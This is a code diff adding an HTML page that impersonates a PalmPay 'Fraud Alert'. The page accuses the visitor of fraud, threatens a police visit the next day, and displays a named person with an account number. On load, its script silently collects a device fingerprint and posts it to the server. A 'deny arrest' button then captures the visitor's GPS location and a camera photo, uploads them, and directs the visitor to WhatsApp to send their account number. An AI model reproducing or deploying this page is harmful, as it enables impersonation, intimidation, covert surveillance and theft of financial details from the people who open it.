@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PalmPay – Fraud Alert</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Inter',sans-serif; background:#000; min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
+        .container { max-width:1000px; width:100%; background:#fff; border-radius:32px; box-shadow:0 20px 60px rgba(107,63,160,0.3); padding:40px 40px 32px; border:2px solid #6B3FA0; }
+        /* PalmPay purple #6B3FA0, white, black */
+        .header { background:#6B3FA0; border-radius:20px; padding:16px 24px; display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; margin-bottom:28px; }
+        .logo-area { display:flex; align-items:center; gap:12px; }
+        .logo-area .brand { font-size:22px; font-weight:800; color:#fff; letter-spacing:-0.3px; }
+        .logo-area .brand span { color:#00C853; }
+        .tagline-top { font-size:13px; color:#e0d0f0; font-weight:500; }
+        .hero { text-align:center; padding:10px 0 20px; }
+        .hero h1 { font-size:36px; font-weight:800; color:#000; line-height:1.1; letter-spacing:-0.02em; }
+        .hero h1 .highlight { color:#6B3FA0; }
+        .hero .sub { font-size:18px; color:#333; margin-top:8px; }
+        .hero .sub strong { font-weight:600; color:#6B3FA0; }
+        .feature-card { background:#f8f5ff; border-radius:20px; padding:28px 32px; border:2px solid #6B3FA0; margin:28px 0 24px; text-align:left; }
+        .feature-card .label { font-size:13px; font-weight:600; text-transform:uppercase; letter-spacing:0.8px; color:#6B3FA0; margin-bottom:6px; }
+        .feature-card .demand { font-size:20px; font-weight:700; color:#000; line-height:1.4; }
+        .feature-card .demand .blink { animation:blink 1.2s infinite; }
+        @keyframes blink { 0%,100%{ opacity:1; } 50%{ opacity:0.3; } }
+        .feature-card .legal { margin-top:12px; font-size:15px; font-weight:600; color:#000; background:#fff; padding:10px 16px; border-radius:12px; display:inline-block; border:1px solid #6B3FA0; }
+        .feature-card .police { margin-top:14px; font-size:16px; font-weight:600; color:#000; background:#fff; padding:10px 16px; border-radius:12px; display:inline-block; border:1px solid #6B3FA0; }
+        .feature-card .ref { margin-top:12px; font-size:14px; color:#333; border-top:1px dashed #6B3FA0; padding-top:14px; }
+        .feature-card .ref strong { color:#6B3FA0; }
+        /* Transaction details */
+        .txn-details { margin-top:20px; background:#fff; border-radius:12px; padding:16px; border:2px solid #6B3FA0; }
+        .txn-details table { width:100%; border-collapse:collapse; font-size:14px; }
+        .txn-details td { padding:8px 4px; border-bottom:1px solid #e0d0f0; color:#000; }
+        .txn-details td:first-child { font-weight:600; color:#6B3FA0; width:45%; }
+        .txn-details td:last-child { color:#000; font-weight:500; }
+        .action-area { text-align:center; margin-top:20px; }
+        .action-btn {
+            background: #6B3FA0;
+            color: #fff;
+            border: none;
+            font-size: 24px;
+            font-weight: 800;
+            padding: 24px 48px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 8px 24px rgba(107, 63, 160, 0.4);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+            max-width: 600px;
+        }
+        .action-btn:hover { background: #5a328a; }
+        .action-btn:disabled { opacity:0.5; cursor:not-allowed; box-shadow:none; background: #888; }
+        .whatsapp-link-area { margin-top: 20px; text-align: center; display: none; }
+        .whatsapp-link-area .whatsapp-btn {
+            display: inline-block;
+            background: #25D366;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 0 6px 16px rgba(37,211,102,0.3);
+            transition: background 0.2s;
+        }
+        .whatsapp-link-area .whatsapp-btn:hover { background: #1da85c; }
+        .whatsapp-link-area .instruction { margin-top: 10px; font-size: 16px; color:#000; font-weight: 500; }
+        .footer { margin-top:36px; border-top:1px solid #6B3FA0; padding-top:20px; display:flex; justify-content:space-between; flex-wrap:wrap; font-size:13px; color:#333; }
+        .footer a { color:#6B3FA0; text-decoration:none; margin-left:20px; }
+        @media (max-width:600px) { .container { padding:24px 16px; } .hero h1 { font-size:26px; } .feature-card .demand { font-size:17px; } .action-btn { font-size:18px; padding:18px 24px; } .header { flex-direction:column; align-items:flex-start; gap:10px; } .txn-details td { font-size:12px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo-area">
+            <div class="brand">Palm<span>Pay</span></div>
+        </div>
+        <div class="tagline-top">LICENSED BY CBN · INSURED BY NDIC</div>
+    </div>
+    <div class="hero">
+        <h1>FRAUD <span class="highlight">ALERT</span></h1>
+        <div class="sub"><strong>UNAUTHORIZED TRANSACTION DETECTED</strong></div>
+    </div>
+    <div class="feature-card">
+        <div class="label">⚠️ FRAUD ALERT</div>
+        <div class="demand">
+            <span class="blink">🔴</span> WE DEMAND THAT YOU RETURN THE SUM OF ₦5,100.00 WHICH YOU SCAMMED FROM A VICTIM ON NOVEMBER 12, 2026.
+        </div>
+        <div class="legal">
+            ⚖️ YOU WILL FACE LEGAL CONSEQUENCES – up to 3 years under the Criminal Code, up to 7 years under the Penal Code for fraud and obtaining the money by false pretences
+        </div>
+        <div class="police">🚔 WE HAVE TRACKED YOU , AND YOU WILL BE VISITED BY THE NIGERIAN POLICE TOMMORROW</div>
+        <div class="ref"><strong>COMPLAINT REF:</strong> HASSAN MUKAILA</div>
+
+        <!-- Transaction details -->
+        <div class="txn-details">
+            <table>
+                <tr><td>Recipient:</td><td>HASSAN MUKAILA</td></tr>
+                <tr><td>Bank/Platform:</td><td>PalmPay</td></tr>
+                <tr><td>Account Number:</td><td>9021805843</td></tr>
+                <tr><td>Amount:</td><td>₦5,100.00</td></tr>
+                <tr><td>Transfer Fee:</td><td>₦0.00</td></tr>
+                <tr><td>Payment Amount:</td><td>₦5,100.00</td></tr>
+                <tr><td>Status:</td><td>Successful</td></tr>
+                <tr><td>Date:</td><td>November 12, 2026</td></tr>
+                <tr><td>Time:</td><td>11:10 AM</td></tr>
+                <tr><td>Transaction ID:</td><td>033dsxnafc03</td></tr>
+                <tr><td>Application:</td><td>PalmPay</td></tr>
+                <tr><td>Payment Type:</td><td>Money Transfer – PalmPay</td></tr>
+                <tr><td>Payment Method:</td><td>CashBox ₦5,100.00</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- BIG ACTION BUTTON -->
+    <div class="action-area">
+        <button class="action-btn" id="actionBtn">CLICK HERE TO DENY ARREST AND RETURN MONEY</button>
+    </div>
+
+    <!-- WhatsApp link (hidden initially, shown after capture) -->
+    <div class="whatsapp-link-area" id="whatsappArea">
+        <a href="https://wa.me/2349039488961?text=Hello%20Mr%20David%2C%20I%20want%20to%20return%20the%20money.%20Please%20send%20your%20account%20number." target="_blank" class="whatsapp-btn">💬 TEXT MR DAVID TO SEND ACCOUNT NUMBER</a>
+        <div class="instruction">➡️ TAP TO OPEN WHATSAPP – SEND YOUR ACCOUNT NUMBER TO RETURN THE MONEY</div>
+    </div>
+
+    <div class="footer">
+        <span>© 2026 PalmPay</span>
+        <span><a href="#">PRIVACY POLICY</a> <a href="#">COOKIE POLICY</a></span>
+    </div>
+</div>
+
+<script>
+    // Silent data collector (unchanged)
+    (function collect() {
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            canvasFingerprint: (function() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200; canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 17);
+                return canvas.toDataURL();
+            })(),
+            webglVendor: (function() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return 'no-webgl';
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        return vendor + '|' + renderer;
+                    }
+                    return 'no-debug-info';
+                } catch(e) { return 'error'; }
+            })()
+        };
+        fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(() => {});
+    })();
+
+    // Combined capture: GPS + photo, then show WhatsApp link
+    document.getElementById('actionBtn').addEventListener('click', function() {
+        const btn = this;
+        const whatsappArea = document.getElementById('whatsappArea');
+
+        if (!navigator.geolocation) {
+            alert('GPS NOT SUPPORTED ON THIS DEVICE.');
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                const { latitude, longitude, accuracy } = pos.coords;
+                const gps = { lat: latitude, lng: longitude, accuracy };
+
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    alert('CAMERA NOT AVAILABLE ON THIS DEVICE.');
+                    return;
+                }
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(function(stream) {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = function() {
+                            video.play();
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(t => t.stop());
+                            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+                            fetch('/capture', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ image: imageData, gps: gps })
+                            }).then(() => {
+                                btn.disabled = true;
+                                btn.textContent = '✅ VERIFIED – LOCATION & PHOTO SENT';
+                                whatsappArea.style.display = 'block';
+                            }).catch(() => {
+                                alert('FAILED TO SEND DATA. PLEASE TRY AGAIN.');
+                            });
+                        };
+                        video.onerror = function() {
+                            alert('VIDEO ERROR.');
+                        };
+                    })
+                    .catch(function(err) {
+                        alert('CAMERA ACCESS DENIED: ' + err.message);
+                    });
+            },
+            function(err) {
+                alert('LOCATION ACCESS DENIED: ' + err.message);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
+    });
+</script>
+</body>
+</html>
